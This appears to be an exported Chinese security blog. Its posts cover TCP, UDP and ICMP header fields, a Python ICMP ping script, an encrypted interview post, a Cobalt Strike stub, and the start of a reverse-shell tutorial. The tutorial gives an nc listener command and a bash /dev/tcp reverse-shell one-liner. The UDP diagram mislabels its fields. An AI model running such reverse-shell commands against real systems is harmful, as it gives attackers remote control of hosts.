<h6 id="源端口和目的端口字段"><a href="#源端口和目的端口字段" class="headerlink" title="源端口和目的端口字段"></a>源端口和目的端口字段</h6><ul>
<li>TCP源端口（Source Port）：源计算机上的应用程序的端口号，占 16 位。</li>
<li>TCP目的端口（Destination Port）：目标计算机的应用程序端口号，占 16 位。</li>
</ul>
<h6 id="序列号字段"><a href="#序列号字段" class="headerlink" title="序列号字段"></a>序列号字段</h6><p>CP序列号（Sequence Number）：占 32 位。它表示本报文段所发送数据的第一个字节的编号。在 TCP 连接中，所传送的字节流的每一个字节都会按顺序编号。当SYN标记不为1时，这是当前数据分段第一个字母的序列号；如果SYN的值是1时，这个字段的值就是初始序列值（ISN），用于对序列号进行同步。这时，第一个字节的序列号比这个字段的值大1，也就是ISN加1。</p>
<h6 id="确认号字段"><a href="#确认号字段" class="headerlink" title="确认号字段"></a>确认号字段</h6><p>TCP 确认号（Acknowledgment Number，ACK Number）：占 32 位。它表示接收方期望收到发送方下一个报文段的第一个字节数据的编号。其值是接收计算机即将接收到的下一个序列号，也就是下一个接收到的字节的序列号加1。</p>
<h6 id="数据偏移字段"><a href="#数据偏移字段" class="headerlink" title="数据偏移字段"></a>数据偏移字段</h6><p>TCP 首部长度（Header Length）：数据偏移是指数据段中的“数据”部分起始处距离 TCP 数据段起始处的字节偏移量，占 4 位。其实这里的“数据偏移”也是在确定 TCP 数据段头部分的长度，告诉接收端的应用程序，数据从何处开始。</p>
<h6 id="保留字段"><a href="#保留字段" class="headerlink" title="保留字段"></a>保留字段</h6><p>保留（Reserved）：占 4 位。为 TCP 将来的发展预留空间，目前必须全部为 0。</p>
<h6 id="标志位字段"><a href="#标志位字段" class="headerlink" title="标志位字段"></a>标志位字段</h6><ul>
<li>CWR（Congestion Window Reduce）：拥塞窗口减少标志，用来表明它接收到了设置 ECE 标志的 TCP 包。并且，发送方收到消息之后，通过减小发送窗口的大小来降低发送速率。</li>
<li>ECE（ECN Echo）：用来在 TCP 三次握手时表明一个 TCP 端是具备 ECN 功能的。在数据传输过程中，它也用来表明接收到的 TCP 包的 IP 头部的 ECN 被设置为 11，即网络线路拥堵。</li>
<li>URG（Urgent）：表示本报文段中发送的数据是否包含紧急数据。URG=1 时表示有紧急数据。当 URG=1 时，后面的紧急指针字段才有效。</li>
<li>ACK：表示前面的确认号字段是否有效。ACK=1 时表示有效。只有当 ACK=1 时，前面的确认号字段才有效。TCP 规定，连接建立后，ACK 必须为 1。</li>
<li>PSH（Push）：告诉对方收到该报文段后是否立即把数据推送给上层。如果值为 1，表示应当立即把数据提交给上层，而不是缓存起来。</li>
<li>RST：表示是否重置连接。如果 RST=1，说明 TCP 连接出现了严重错误（如主机崩溃），必须释放连接，然后再重新建立连接。</li>
<li>SYN：在建立连接时使用，用来同步序号。当 SYN=1，ACK=0 时，表示这是一个请求建立连接的报文段；当 SYN=1，ACK=1 时，表示对方同意建立连接。SYN=1 时，说明这是一个请求建立连接或同意建立连接的报文。只有在前两次握手中 SYN 才为 1。</li>
<li>FIN：标记数据是否发送完毕。如果 FIN=1，表示数据已经发送完成，可以释放连接。</li>
</ul>
<h6 id="窗口大小字段"><a href="#窗口大小字段" class="headerlink" title="窗口大小字段"></a>窗口大小字段</h6><p>窗口大小（Window Size）：占 16 位。它表示从 Ack Number 开始还可以接收多少字节的数据量，也表示当前接收端的接收窗口还有多少剩余空间。该字段可以用于 TCP 的流量控制。</p>
<h6 id="TCP-校验和字段"><a href="#TCP-校验和字段" class="headerlink" title="TCP 校验和字段"></a>TCP 校验和字段</h6><p>校验位（TCP Checksum）：占 16 位。它用于确认传输的数据是否有损坏。发送端基于数据内容校验生成一个数值，接收端根据接收的数据校验生成一个值。两个值必须相同，才能证明数据是有效的。如果两个值不同，则丢掉这个数据包。Checksum 是根据伪头 + TCP 头 + TCP 数据三部分进行计算的。</p>
<h6 id="紧急指针字段"><a href="#紧急指针字段" class="headerlink" title="紧急指针字段"></a>紧急指针字段</h6><p>紧急指针（Urgent Pointer）：仅当前面的 URG 控制位为 1 时才有意义。它指出本数据段中为紧急数据的字节数，占 16 位。当所有紧急数据处理完后，TCP 就会告诉应用程序恢复到正常操作。即使当前窗口大小为 0，也是可以发送紧急数据的，因为紧急数据无须缓存。</p>
<h6 id="可选项字段"><a href="#可选项字段" class="headerlink" title="可选项字段"></a>可选项字段</h6><p>选项（Option）：长度不定，但长度必须是 32bits 的整数倍。</p>
</li>
<li><p>UDP</p>
<p>+————————-+————————–+<br>|   16位源端口号   ｜   16位源端口号    ｜<br>+————————-+————————–+<br>|   16位源端口号   ｜   16位源端口号    ｜<br>+————————-+————————–+<br>|                            数据                             ｜<br>+————————-+————————–+</p>
<ul>
<li>源端口：16位，标识本地端口</li>
<li>目的端口：16位，标识目标端口</li>
<li>总长度：标识该报文段包括报头部分的所有数据字节的长度。</li>
<li>校验和：计算方式和TCP相似</li>
<li>数据：可变长度</li>
</ul>
</li>
<li><p>ICMP</p>
<p>+————————-+————————–+—————————+<br>|         8位类型       ｜         8位代码        ｜       16位校验和     ｜<br>+————————-+————————–+—————————+<br>|             16位 标识符              ｜           序列号16位                  ｜<br>+—————————————+—————————————–+<br>|                                        选项（若有）                                      ｜<br>+—————————————+—————————————–+</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>代码</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>回显应答（ping 应答）</td>
</tr>
<tr>
<td>3</td>
<td>0</td>
<td>网络不可达</td>
</tr>
<tr>
<td>3</td>
<td>1</td>
<td>主机不可达</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>协议不可达</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>端口不可达</td>
</tr>
<tr>
<td>3</td>
<td>4</td>
<td>需要进行分片，但设置不分片位</td>
</tr>
<tr>
<td>3</td>
<td>5</td>
<td>源站选路失败</td>
</tr>
<tr>
<td>3</td>
<td>6</td>
<td>目的网络未知</td>
</tr>
<tr>
<td>3</td>
<td>7</td>
<td>目的主机未知</td>
</tr>
<tr>
<td>3</td>
<td>9</td>
<td>目的网络被强制禁止</td>
</tr>
<tr>
<td>3</td>
<td>10</td>
<td>目的主机被强制禁止</td>
</tr>
<tr>
<td>3</td>
<td>11</td>
<td>由于服务类型 TOS，网络不可达</td>
</tr>
<tr>
<td>3</td>
<td>12</td>
<td>由于服务类型 TOS，主机不可达</td>
</tr>
<tr>
<td>3</td>
<td>13</td>
<td>由于过滤，通信被强制禁止</td>
</tr>
<tr>
<td>3</td>
<td>14</td>
<td>主机越权</td>
</tr>
<tr>
<td>3</td>
<td>15</td>
<td>优先中止失效</td>
</tr>
<tr>
<td>4</td>
<td>0</td>
<td>源端被关闭（基本流控制）</td>
</tr>
<tr>
<td>5</td>
<td>0</td>
<td>对网络重定向</td>
</tr>
<tr>
<td>5</td>
<td>1</td>
<td>对主机重定向</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>对服务类型和网络重定向</td>
</tr>
<tr>
<td>5</td>
<td>3</td>
<td>对服务类型和主机重定向</td>
</tr>
<tr>
<td>8</td>
<td>0</td>
<td>回显请求（ping 请求）</td>
</tr>
<tr>
<td>9</td>
<td>0</td>
<td>路由器通告</td>
</tr>
<tr>
<td>10</td>
<td>0</td>
<td>路由器请求</td>
</tr>
<tr>
<td>11</td>
<td>0</td>
<td>传输期间生存时间为 0</td>
</tr>
<tr>
<td>11</td>
<td>1</td>
<td>在数据报组装期间生存时间为 0</td>
</tr>
<tr>
<td>12</td>
<td>0</td>
<td>坏的 IP 首部</td>
</tr>
<tr>
<td>12</td>
<td>1</td>
<td>缺少必需的选项</td>
</tr>
<tr>
<td>13</td>
<td>0</td>
<td>时间戳请求</td>
</tr>
<tr>
<td>14</td>
<td>0</td>
<td>时间戳应答</td>
</tr>
<tr>
<td>17</td>
<td>0</td>
<td>地址掩码请求</td>
</tr>
<tr>
<td>18</td>
<td>0</td>
<td>地址掩码应答</td>
</tr>
</tbody></table>
</li>
</ol>
<p>校验和计算</p>
<p>在发送数据时，为了计算数据包的校验和。应该按如下步骤：<br>（1）把校验和字段置为0；　　<br>（2）把需校验的数据看成以16位为单位的数字组成，依次进行二进制反码求和；<br>（3）把得到的结果存入校验和字段中。　　在接收数据时，计算数据包的校验和相对简单，按如下步骤：</p>
<blockquote>
<p>（1）把首部看成以16位为单位的数字组成，依次进行二进制反码求和，包括校验和字段；　　<br>（2）检查计算出的校验和的结果是否为0；<br>（3）如果等于0，说明被整除，校验是和正确。否则，校验和就是错误的，协议栈要抛弃这个数据包。</p>
</blockquote>
<p>虽然上面四种报文的校验和算法一样，但在作用范围存在不同：IP校验和只校验20字节的IP报头；而ICMP校验和覆盖整个报文（ICMP报头+ICMP数据）；UDP和TCP校验和不仅覆盖整个报文，而且还有12字节的IP伪首部，包括源IP地址(4字节)、目的IP地址(4字节)、协议(2字节，第一字节补0)和TCP/UDP包长(2字节)。另外UDP、TCP数据报的长度可以为奇数字节，所以在计算校验和时需要在最后增加填充字节0（注意，填充字节只是为了计算校验和，可以不被传送）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_check</span><span class="params">(data)</span>:</span></span><br><span class="line">    print(data)</span><br><span class="line">    length = len(data)</span><br><span class="line">    flag = length % <span class="number">2</span>  <span class="comment"># 判断data长度是否是偶数字节</span></span><br><span class="line">    sum = <span class="number">0</span>  <span class="comment"># 记录(十进制)相加的结果</span></span><br><span class="line">    data=binascii.b2a_hex(data)</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">4</span>):  <span class="comment"># 将每两个字节(16位)相加（二进制求和）直到最后得出结果</span></span><br><span class="line">        sum += int(data[i+<span class="number">2</span>:i+<span class="number">4</span>]+data[i:i+<span class="number">2</span>],<span class="number">16</span>) <span class="comment"># 传入data以每两个字节（十六进制）通过ord转十进制，第一字节在低位，第二个字节在高位\</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:  <span class="comment"># 传入的data长度是奇数，将执行，且把这个字节（8位）加到前面的结果</span></span><br><span class="line">        sum += int(data[<span class="number">-2</span>:],<span class="number">16</span>)</span><br><span class="line">    print(hex(sum))</span><br><span class="line">    <span class="comment"># 将高于16位与低16位相加</span></span><br><span class="line">    sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>)</span><br><span class="line">    sum += (sum &gt;&gt; <span class="number">16</span>)  <span class="comment"># 如果还有高于16位，将继续与低16位相加</span></span><br><span class="line">    answer = ~sum &amp; <span class="number">0xffff</span>  <span class="comment"># 对sum取反(返回的是十进制)</span></span><br><span class="line">    <span class="comment"># 主机字节序转网络字节序列（参考小端序转大端序）</span></span><br><span class="line">    answer = answer &gt;&gt; <span class="number">8</span> | (answer &lt;&lt; <span class="number">8</span> &amp; <span class="number">0xff00</span>)</span><br><span class="line">    <span class="keyword">return</span> answer  <span class="comment"># 最终返回的结果就是wireshark里面看到的checksum校验和</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_pack</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># icmp header</span></span><br><span class="line">    icmp_type = <span class="number">8</span></span><br><span class="line">    icmp_code = <span class="number">0</span></span><br><span class="line">    icmp_check_sum = <span class="number">0</span></span><br><span class="line">    icmp_id = <span class="number">1</span></span><br><span class="line">    icmp_seq = <span class="number">11</span></span><br><span class="line">    icmp_date = <span class="string">b'Hello!'</span></span><br><span class="line"></span><br><span class="line">    icmp_header = struct.pack(<span class="string">'!BBHHH6s'</span>, icmp_type, icmp_code, icmp_check_sum, icmp_id, icmp_seq, icmp_date)</span><br><span class="line">    icmp_check_sum=icmp_check(icmp_header)</span><br><span class="line"></span><br><span class="line">    icmp_header = struct.pack(<span class="string">'!BBHHH6s'</span>, icmp_type, icmp_code, icmp_check_sum, icmp_id, icmp_seq, icmp_date)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> icmp_header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(ip)</span>:</span></span><br><span class="line">    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)</span><br><span class="line">    packets = icmp_pack()</span><br><span class="line">    raw_sock.sendto(packets, (ip, <span class="number">0</span>))</span><br><span class="line">    reply_date,address=raw_sock.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    reply_date=struct.unpack(<span class="string">'!BBHHHBBH4s4sBBHHH6s'</span>,reply_date)</span><br><span class="line">    <span class="comment"># print(binascii.b2a_hex(reply_date))</span></span><br><span class="line">    print(<span class="string">'Success! Host is up, the reply from '</span>,ip,<span class="string">' ttl is '</span>,reply_date[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main(<span class="string">'127.0.0.1'</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
  </entry>
  <entry>
    <title>【凉】腾讯实习生面经</title>
    <url>/2020/03/13/%E8%85%BE%E8%AE%AF%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      <categories>
        <category>面试</category>
      </categories>
  </entry>
  <entry>
    <title>Cobalt Strike的使用</title>
    <url>/2020/03/12/Cobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>目录文件介绍</p>
<blockquote>
<p>agscript拓展应用的脚本</p>
<p>c2lint 用于检查profile的错误异常</p>
</blockquote>
<a id="more"></a>
<blockquote>
<p>teamserver服务端程序</p>
<p>cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</p>
<p>logs目录记录与目标主机的相关信息</p>
<p>update，update.jar用于更新CS（盗版无法更新）</p>
<p>third-party第三方工具</p>
</blockquote>
]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
      <tags>
        <tag>保持更新</tag>
        <tag>工具使用</tag>
        <tag>待补充</tag>
      </tags>
  </entry>
  <entry>
    <title>关于反弹shell的姿势</title>
    <url>/2020/03/05/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h2 id="linux下的反弹"><a href="#linux下的反弹" class="headerlink" title="linux下的反弹"></a>linux下的反弹</h2><p>本机使用nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><p>linux shell下常用的文件描述符是：</p>
<blockquote>
<ol>
<li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p>
</li>
<li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p>
</li>
<li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
</li>
</ol>
</blockquote>
</li>
<li><p>bash -i 新开一个交互bash</p>
</li>
<li><p>&gt;&amp;或者 &amp;&gt;  将标准错误输出定向到标准输出中</p>
</li>
<li><p>0&gt;&amp;1或者0&lt;&amp;1将标准输入重定向到标准输出中</p>
</li>
<li><p>/dev/tcp/host/port  使用tcp通道与host:post建立一个连接</p>
</li>
<li><p>如果还是不清楚 参考手册<a href="https://www.gnu.org/software/bash/manual/bash.pdf" target="_blank" rel="noopener">https://www.gnu.org/software/bash/manual/bash.pdf</a> 3.6 章redirections</p>
</li>
</ul>
</blockquote>
